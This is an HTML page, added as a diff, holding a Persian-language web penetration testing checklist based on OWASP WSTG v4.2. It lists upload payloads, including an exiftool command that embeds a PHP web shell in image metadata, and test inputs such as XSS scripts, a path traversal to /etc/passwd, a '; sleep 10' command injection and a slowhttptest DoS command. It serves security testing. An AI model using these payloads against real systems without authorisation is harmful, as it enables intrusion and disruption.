@@ -1,0 +1,339 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>چک‌لیست عملیاتی تست نفوذ وب - OWASP WSTG v4.2</title>
+    <style>
+        :root {
+            --bg-color: #0f172a;
+            --card-bg: #1e293b;
+            --text-color: #f1f5f9;
+            --accent-color: #38bdf8;
+            --border-color: #334155;
+            --code-bg: #090d16;
+        }
+        body {
+            font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            margin: 0;
+            padding: 20px;
+            line-height: 1.6;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        h1 {
+            color: var(--accent-color);
+            margin-bottom: 5px;
+        }
+        p.sub {
+            color: #94a3b8;
+            margin-top: 0;
+        }
+        .card {
+            background-color: var(--card-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 25px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
+        }
+        h2 {
+            color: var(--accent-color);
+            border-bottom: 2px solid var(--border-color);
+            padding-bottom: 10px;
+            margin-top: 0;
+        }
+        .table-responsive {
+            overflow-x: auto;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 15px;
+            background-color: var(--card-bg);
+            border-radius: 8px;
+            overflow: hidden;
+            white-space: nowrap;
+        }
+        th, td {
+            padding: 12px 15px;
+            text-align: right;
+            border-bottom: 1px solid var(--border-color);
+            white-space: normal;
+        }
+        th {
+            background-color: #0284c7;
+            color: white;
+        }
+        tr:hover {
+            background-color: #273548;
+        }
+        code {
+            background-color: var(--code-bg);
+            color: #38bdf8;
+            padding: 3px 6px;
+            border-radius: 4px;
+            font-family: monospace;
+            direction: ltr;
+            text-align: left;
+            display: inline-block;
+        }
+        .badge {
+            background-color: #0369a1;
+            color: white;
+            padding: 3px 8px;
+            border-radius: 4px;
+            font-size: 0.85em;
+            font-family: monospace;
+        }
+        footer {
+            text-align: center;
+            color: #64748b;
+            margin-top: 40px;
+            font-size: 0.9em;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>چک‌لیست تست نفوذ وب</h1>
+            <p class="sub">مرجع عملیاتی و ابزارهای تست مبتنی بر OWASP WSTG v4.2</p>
+        </header>
+
+        <div class="card">
+            <h2>🛠️ بخش اول: پی‌لودهای اختصاصی (آپلود فایل و RCE/XSS)</h2>
+            <div class="table-responsive">
+                <table>
+                    <tr>
+                        <th>نوع پی‌لود</th>
+                        <th>کد / ساختار</th>
+                        <th>نحوه استفاده عملیاتی</th>
+                    </tr>
+                    <tr>
+                        <td><strong>SVG XSS</strong></td>
+                        <td><code>&lt;svg onload="alert('XSS')"&gt;&lt;/svg&gt;</code></td>
+                        <td>ذخیره با پسوند <code>.svg</code> و آپلود در بخش تصویر پروفایل یا گالری.</td>
+                    </tr>
+                    <tr>
+                        <td><strong>PHP Metadata</strong></td>
+                        <td><code>exiftool -Comment='&lt;?php system($_GET["cmd"]); ?&gt;' img.jpg</code></td>
+                        <td>تزریق کد مخرب داخل متادیتای عکس در لینوکس و آپلود جهت دور زدن فیلتر نوع فایل.</td>
+                    </tr>
+                    <tr>
+                        <td><strong>PDF Polyglot</strong></td>
+                        <td><code>%PDF-1.4 ... %&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
+                        <td>ساخت فایل متنی با هدر PDF و افزودن تگ جاوا اسکریپت در انتهای آن.</td>
+                    </tr>
+                </table>
+            </div>
+        </div>
+
+        <div class="card">
+            <h2>📋 بخش دوم: چک‌لیست اجرایی WSTG v4.2</h2>
+            <div class="table-responsive">
+                <table>
+                    <tr>
+                        <th>شناسه OWASP</th>
+                        <th>دسته‌بندی اصلی</th>
+                        <th>ابزار تست</th>
+                        <th>سناریو و روش تست عملیاتی</th>
+                    </tr>
+                    <tr>
+                        <td><span class="badge">WSTG-INFO-01</span></td>
+                        <td>موتورهای جستجو</td>
+                        <td>Google</td>
+                        <td>بررسی دورک‌ها: جستجوی <code>site:target.com ext:pdf OR ext:sql</code> برای یافتن فایل‌های حساس لو رفته.</td>
+                    </tr>
+                    <tr>
+                        <td><span class="badge">WSTG-INFO-02</span></td>
+                        <td>شناسایی وب‌سرور</td>
+                        <td>Burp Suite</td>
+                        <td>ارسال درخواست با متد نامعتبر (مثل <code>TEST</code>) و بررسی هدر <code>Server</code> و <code>X-Powered-By</code> در پاسخ.</td>
+                    </tr>
+                    <tr>
+                        <td><span class="badge">WSTG-INFO-03</span></td>
+                        <td>فایل‌های متادیتا</td>
+                        <td>Browser</td>
+                        <td>بررسی دسترسی به فایل‌های <code>/robots.txt</code>، <code>/sitemap.xml</code> و <code>/.well-known/security.txt</code>.</td>
+                    </tr>
+                    <tr>
+                        <td><span class="badge">WSTG-INFO-05</span></td>
+                        <td>کامنت‌های HTML</td>
+                        <td>Burp Suite</td>
+                        <td>استفاده از قابلیت <code>Engagement tools -> Find comments</code> در تاریخچه پروکسی برای استخراج یادداشت‌های برنامه‌نویسان.</td>
+                    </tr>
+                    <tr>
+                        <td><span class="badge">WSTG-CONF-01</span></td>
+                        <td>بررسی SSL/TLS</td>
+                        <td>sslscan</td>
+                        <td>اجرای دستور <code>sslscan target.com</code> در ترمینال برای شناسایی پروتکل‌های ضعیف مثل TLS 1.0 یا SSLv3.</td>
+                    </tr>
+                    <tr>
+                        <td><span class="badge">WSTG-CONF-05</span></td>
+                        <td>بررسی CORS</td>
+                        <td>Burp Suite</td>
+                        <td>افزودن هدر <code>Origin: https://evil.com</code> در Repeater و بررسی انعکاس آن در پاسخ سرور.</td>
+                    </tr>
+                    <tr>
+                        <td><span class="badge">WSTG-CONF-06</span></td>
+                        <td>متدهای HTTP</td>
+                        <td>Burp Suite</td>
+                        <td>تغییر متد به <code>OPTIONS</code> و تست آپلود فایل با متد <code>PUT</code> در صورت باز بودن دسترسی.</td>
+                    </tr>
+                    <tr>
+                        <td><span class="badge">WSTG-CONF-07</span></td>
+                        <td>بررسی HSTS</td>
+                        <td>Burp Suite</td>
+                        <td>بررسی وجود هدر <code>Strict-Transport-Security</code> در پاسخ سرور برای اطمینان از اجبار انتقال به HTTPS.</td>
+                    </tr>
+                    <tr>
+                        <td><span class="badge">WSTG-IDNT-04</span></td>
+                        <td>شمارش کاربران</td>
+                        <td>Intruder</td>
+                        <td>بررسی صفحه فراموشی رمز با لیست ایمیل‌ها و مقایسه تفاوت در طول پاسخ (Response Length) برای شناسایی ایمیل‌های معتبر.</td>
+                    </tr>
+                    <tr>
+                        <td><span class="badge">WSTG-AUTHN-01</span></td>
+                        <td>پسورد پیش‌فرض</td>
+                        <td>Browser</td>
+                        <td>تست ترکیب‌های رایج مانند <code>admin/admin</code> یا <code>root/password</code> در پنل‌های مدیریتی.</td>
+                    </tr>
+                    <tr>
+                        <td><span class="badge">WSTG-AUTHN-02</span></td>
+                        <td>دور زدن لاگین</td>
+                        <td>Burp Suite</td>
+                        <td>تغییر پارامترهای JSON در پاسخ لاگین (مثلاً تغییر کلید <code>auth: false</code> به <code>true</code>).</td>
+                    </tr>
+                    <tr>
+                        <td><span class="badge">WSTG-AUTHN-03</span></td>
+                        <td>قفل اکانت (Lockout)</td>
+                        <td>Intruder</td>
+                        <td>ارسال متوالی ۲۰ پسورد اشتباه برای یک اکانت جهت سنجش مکانیزم محدودسازی تلاش‌ها.</td>
+                    </tr>
+                    <tr>
+                        <td><span class="badge">WSTG-AUTHZ-01</span></td>
+                        <td>پیمایش مسیر (LFI)</td>
+                        <td>Burp Suite</td>
+                        <td>تغییر پارامترهای فایل به مقادیری مانند <code>../../../../etc/passwd</code> برای خواندن فایل‌های سیستمی.</td>
+                    </tr>
+                    <tr>
+                        <td><span class="badge">WSTG-AUTHZ-02</span></td>
+                        <td>دور زدن دسترسی</td>
+                        <td>Browser</td>
+                        <td>کپی لینک پنل ادمین و باز کردن آن با حساب کاربری عادی جهت تست عدم اعمال صحیح سطح دسترسی.</td>
+                    </tr>
+                    <tr>
+                        <td><span class="badge">WSTG-AUTHZ-04</span></td>
+                        <td>آسیب‌پذیری IDOR</td>
+                        <td>Burp Suite</td>
+                        <td>تغییر پارامترهای شناسایی (مثل <code>user_id=10</code> به <code>11</code>) برای دسترسی غیرمجاز به اطلاعات دیگران.</td>
+                    </tr>
+                    <tr>
+                        <td><span class="badge">WSTG-SESS-01</span></td>
+                        <td>دور زدن سشن</td>
+                        <td>Burp Suite</td>
+                        <td>حذف کوکی از درخواست و تلاش برای دسترسی به صفحات داخلیِ نیازمند احراز هویت.</td>
+                    </tr>
+                    <tr>
+                        <td><span class="badge">WSTG-SESS-02</span></td>
+                        <td>فلگ‌های کوکی</td>
+                        <td>Burp Suite</td>
+                        <td>بررسی وجود فلگ‌های امنیتی <code>HttpOnly</code> و <code>Secure</code> در هدر <code>Set-Cookie</code>.</td>
+                    </tr>
+                    <tr>
+                        <td><span class="badge">WSTG-SESS-04</span></td>
+                        <td>سشن در URL</td>
+                        <td>Browser</td>
+                        <td>بررسی عدم نمایش توکن‌های نشست در نوار آدرس (URL Bar) مرورگر در طول پیمایش سایت.</td>
+                    </tr>
+                    <tr>
+                        <td><span class="badge">WSTG-SESS-06</span></td>
+                        <td>ابطال سشن (Logout)</td>
+                        <td>Burp Suite</td>
+                        <td>ثبت درخواست پروفایل، کلیک روی خروج در مرورگر، و ارسال مجدد درخواست در Repeater برای بررسی معتبر ماندن سشن.</td>
+                    </tr>
+                    <tr>
+                        <td><span class="badge">WSTG-SESS-08</span></td>
+                        <td>تایم‌اوت سشن</td>
+                        <td>Browser</td>
+                        <td>بررسی مکانیزم انقضای خودکار سشن پس از مدتی بی‌حکتی کاربر در سیستم.</td>
+                    </tr>
+                    <tr>
+                        <td><span class="badge">WSTG-INPV-01</span></td>
+                        <td>XSS انعکاسی</td>
+                        <td>Browser</td>
+                        <td>وارد کردن پی‌لود <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> در فیلدهای جستجو یا پارامترهای URL.</td>
+                    </tr>
+                    <tr>
+                        <td><span class="badge">WSTG-INPV-02</span></td>
+                        <td>XSS ذخیره‌شده</td>
+                        <td>Browser</td>
+                        <td>تزریق پی‌لود در بخش نظرات یا پروفایل و بررسی اجرای آن هنگام بارگذاری مجدد صفحه.</td>
+                    </tr>
+                    <tr>
+                        <td><span class="badge">WSTG-INPV-05</span></td>
+                        <td>تزریق SQL (SQLi)</td>
+                        <td>Burp Suite</td>
+                        <td>افزودن کاراکتر کوتیشن <code>'</code> به انتهای پارامترها جهت دریافت خطای ساختار پایگاه داده.</td>
+                    </tr>
+                    <tr>
+                        <td><span class="badge">WSTG-INPV-07</span></td>
+                        <td>آسیب‌پذیری XXE</td>
+                        <td>Burp Suite</td>
+                        <td>تزریق موجودیت‌های خارجی XML در درخواست‌های ساختاریافته برای خواندن فایل‌های سرور.</td>
+                    </tr>
+                    <tr>
+                        <td><span class="badge">WSTG-INPV-11</span></td>
+                        <td>تزریق دستور (OS)</td>
+                        <td>Burp Suite</td>
+                        <td>افزودن کاراکترهایی مانند <code>; sleep 10</code> به پارامترهای ورودی جهت سنجش تأخیر در پاسخ سرور.</td>
+                    </tr>
+                    <tr>
+                        <td><span class="badge">WSTG-ERRH-01</span></td>
+                        <td>خطاهای نشتی</td>
+                        <td>Burp Suite</td>
+                        <td>ارسال مقادیر نامعتبر به پارامترها برای بررسی نشتی اطلاعات پشته (Stack Trace) و ورژن فریم‌ورک.</td>
+                    </tr>
+                    <tr>
+                        <td><span class="badge">WSTG-CRYP-01</span></td>
+                        <td>رمزنگاری کانال</td>
+                        <td>Browser</td>
+                        <td>تست بارگذاری سایت با پروتکل <code>http://</code> و بررسی اجبار ریدایرکت خودکار به پروتکل امن <code>https://</code>.</td>
+                    </tr>
+                    <tr>
+                        <td><span class="badge">WSTG-BUSL-01</span></td>
+                        <td>منطق اعتبارسنجی</td>
+                        <td>Burp Suite</td>
+                        <td>تست مقادیر غیرمنطقی مانند ثبت تعداد محصول منفی (مثلاً <code>-1</code>) در سبد خرید.</td>
+                    </tr>
+                    <tr>
+                        <td><span class="badge">WSTG-BUSL-09</span></td>
+                        <td>حمله DoS لایه ۷</td>
+                        <td>slowhttptest</td>
+                        <td>اجرای دستور <code>slowhttptest -c 500 -H -i 10 -r 100 -t GET -u https://target.com</code> برای تست پایداری.</td>
+                    </tr>
+                    <tr>
+                        <td><span class="badge">WSTG-CLNT-11</span></td>
+                        <td>حافظه محلی مرورگر</td>
+                        <td>Browser (F12)</td>
+                        <td>بررسی تب Application > Local Storage برای اطمینان از عدم ذخیره توکن‌ها یا اطلاعات حساس به صورت متن ساده (Plain Text).</td>
+                    </tr>
+                </table>
+            </div>
+        </div>
+
+        <footer>
+            OWASP Web Security Testing Guide v4.2 - Practical Checklist
+        </footer>
+    </div>
+</body>
+</html>
